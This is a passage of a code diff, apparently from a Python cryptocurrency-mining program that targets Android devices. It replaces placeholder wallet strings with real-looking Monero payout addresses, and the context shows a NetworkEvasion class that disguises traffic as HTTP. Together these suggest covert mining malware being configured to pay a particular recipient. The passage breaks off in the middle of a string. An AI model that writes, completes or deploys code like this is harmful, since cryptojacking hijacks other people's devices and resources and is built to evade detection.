@@ -52,7 +52,7 @@ try:
 except Exception:
     ANDROID_AVAILABLE = False
 
-WALLET_ADDRESS = "YOUR_WALLET_ADDRESS_HERE"
+WALLET_ADDRESS = "428n5oBUQPA1rGPfvFF13f4C4TJd1XsX6EHihdqNxoTnKk8tXGFNsCHS3oketz7YBd1wJga8Q96ikgg4v1Vz7xv7VLMEevN"
 
 ANDROID_SERVICE = None
 try:
@@ -129,8 +129,9 @@ class NetworkEvasion:
         return http_header.encode() + payload
 
 class WalletManager:
-    MASTER_WALLET = "4AbCDefGHijKLmnOPqrSTuvWXyz1234567890AbCDefGHijKLmnOPqrSTuvWXyz12345"
-    SUBADDRESSES = []
+    MASTER_WALLET = "428n5oBUQPA1rGPfvFF13f4C4TJd1XsX6EHihdqNxoTnKk8tXGFNsCHS3oketz7YBd1wJga8Q96ikgg4v1Vz7xv7VLMEevN"
+    SUBADDRESSES = ["84VK9aJ3QaP8MCkiV44xhecMhLkRyniYocf7FnCPddoMZSwKewZGuMjTkYELVbxoYr14qYdiJuN2jU9ouDj9GgAtQQc6SVJ",
+                    "
     
     def __init__(self):
         if self.SUBADDRESSES:
